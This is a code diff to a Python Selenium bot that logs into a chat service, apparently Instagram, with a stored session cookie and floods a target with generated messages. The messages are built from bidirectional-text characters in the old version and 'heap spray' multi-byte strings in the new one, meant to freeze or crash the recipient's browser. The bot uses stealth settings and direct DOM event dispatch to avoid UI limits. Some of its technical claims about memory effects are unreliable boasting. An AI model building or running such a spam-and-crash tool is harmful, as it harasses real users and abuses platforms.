@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (BIDI-CRUSHER V44)
-# 📅 STATUS: MAIN-THREAD-FREEZE | 4-AGENT TOTAL | AWS-CPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (HEAP-SPRAY V45)
+# 📅 STATUS: MEMORY-CRASH-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,30 +12,32 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.2)   # 🔥 Extreme Velocity
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 3          
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM VELOCITY
+REST_AFTER_STRIKES = 200   
+REST_DURATION = 2          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_bidi_crusher_payload():
-    """Forces the browser to calculate 300+ directional shifts per message."""
+def get_heap_spray_payload():
+    """Generates a high-byte payload designed to fragment the V8 Heap."""
     u_id = random.randint(100, 999)
-    # \u2066 = LTR Isolate | \u2067 = RTL Isolate | \u2069 = Pop Isolate
-    # \u2060 = Word Joiner
-    lri, rli, pop, glue = "\u2066", "\u2067", "\u2069", "\u2060"
+    # 𒀱 = High-plane Cuneiform (4 bytes)
+    # 🌙 = Moon Emoji (4 bytes)
+    # We mix these to prevent 'String Interning' (memory deduplication)
+    heavy = ["𒀱", "🌙", "𝕻", "𝙰"]
+    glue = "\u2060"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [BIDI_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HEAP_STRIKE:{u_id}]"
     
     body = []
-    # 350 lines of recursive directional math
-    for i in range(350):
-        # We alternate directions constantly. This forces the browser to 
-        # restart its layout calculation 4 times PER LINE.
-        # [LTR] PRAVEER [RTL] PAPA [LTR] ON [RTL] TOP
-        line = f"{lri}PRAVEER{pop}{rli}PAPA{pop}{lri}ON{pop}{rli}TOP{pop}🌙{i}{glue*10}"
+    # 410 lines - Hitting the absolute limit of the socket buffer
+    for i in range(410):
+        # Randomizing the sequence forces the browser to allocate a new memory 
+        # pointer for every single line rather than reusing an old one.
+        random.shuffle(heavy)
+        line = f"PRAVEER PAPA {''.join(heavy * 8)} {i}{glue*5}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9995]
@@ -46,7 +48,8 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") # Force CPU to do the BiDi math
+        # Optimization for local stability
+        chrome_options.add_argument("--js-flags='--max-old-space-size=4096'") 
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -55,17 +58,15 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def hyper_send(driver, text):
-    """Bypasses UI lag by forcing a direct DOM 'Enter' event."""
+def atomic_send(driver, text):
+    """Direct DOM-Event dispatch for hyper-speed delivery."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
                 document.execCommand('insertText', false, arguments[0]);
-                var e = new KeyboardEvent('keydown', {
-                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
-                });
+                var e = new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true});
                 box.dispatchEvent(e);
             }
         """, text)
@@ -83,23 +84,22 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_bidi_crusher_payload()
-                if hyper_send(driver, payload):
+                payload = get_heap_spray_payload()
+                if atomic_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: BiDi-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Heap-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 80 == 0:
+                    if strike_count % 75 == 0:
                         driver.refresh()
-                        time.sleep(8)
-                
+                        time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(3)
+            time.sleep(2)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
